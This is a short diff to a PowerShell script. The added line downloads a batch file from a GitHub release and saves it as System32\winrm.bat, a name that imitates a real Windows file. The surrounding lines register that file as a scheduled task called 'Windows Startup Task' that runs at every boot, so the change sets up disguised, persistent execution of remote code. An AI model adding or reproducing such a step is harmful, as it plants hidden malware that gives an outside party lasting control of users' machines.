@@ -14,6 +14,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $os = Get-WmiObject -Class Win32_OperatingSystem
 $windowsDrive = [System.IO.Path]::GetPathRoot($os.SystemDirectory)
 $filecmd = "$windowsDrive\Windows\System32\winrm.bat"
+Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "$filecmd"
 $task_name = "Windows Startup Task"
 $task_action = New-ScheduledTaskAction -Execute $filecmd
 $task_trigger = New-ScheduledTaskTrigger -AtStartup
